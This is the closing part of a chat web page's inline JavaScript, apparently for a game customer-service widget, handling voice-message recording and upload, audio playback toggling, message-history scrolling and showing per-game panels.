                                                    data: {visiter_id:visiter_id,content: voicemessage,business_id: business_id, avatar: pic,record: record,service_id:service_id},
                                                    dataType:'json',
                                                    success:function(res){
                                                        if(res.code != 0){
                                                            layer.msg(res.msg,{icon:2});
                                                        }
                                                    }
                                                });
                                            }
                                        };
                                        xhr.open('POST', '/admin/event/uploadVoice');
                                        xhr.send(fd);
                                    });
                                    recorder.clear();
                                    layer.close(index);
                                }
                                , btn2: function (index, layero) {
                                    //按钮【按钮二】的回调
                                    recorder && recorder.stop();
                                    recorder.clear();
                                    audio_context.close();
                                    layer.close(index);
                                }
                            });

                        });
                    } else {
                        
                            layer.msg('音频输入只支持https协议！');
                        
                    }


                }, function (e) {
                     layer.msg('音频输入只支持https协议！');
                });


        }
    }

  
   var getstate =function(obj){
       
       var c=obj.children[0];
 
       var state=$(obj).attr('data');
       if(state == 'play'){
         c.play();
         $(obj).attr('data','pause');
         $(obj).find('i').html("");
       
       }else if(state == 'pause'){
          c.pause();
         $(obj).attr('data','play');
          $(obj).find('i').html("");
       }

        c.addEventListener('ended', function () {  
         $(obj).attr('data','play');
         $(obj).find('i').html("");
        
       }, false);
    }

   


   document.getElementById("wrap").onscroll = function(){
        var t =  document.getElementById("wrap").scrollTop;
        if( t == 0 ) {
            if($.cookie("cid") != ""){
                getdata();
            }
        }
    }
    
    var text = document.getElementById('text_in');
    // 获取焦点，拉到底部
    text.onfocus  = function() {
        $(".tool_box").hide();
        let height = +document.documentElement.clientHeight;
        $('html ,body').animate({scrollTop: height}, 0);

    }
    // 失去焦点，拉到顶部
    text.onblur = function() {
        setTimeout(function() {
            $('html ,body').animate({scrollTop: 0}, 0);
        },0)
   
    }
    var test = $('#test').val();
  
if(test == '王者荣耀'){
	document.getElementById("wz").style.display="";
}
if(test == 'QQ飞车手游'){
	document.getElementById("fc").style.display="";
}
if(test == '梦幻西游'){
	document.getElementById("mh").style.display="";
}
if(test == '穿越火线：枪战王者'){
	document.getElementById("cf").style.display="";
}
if(test == '和平精英'){
	document.getElementById("hp").style.display="";
}

</script>
</body>
</html>


</html>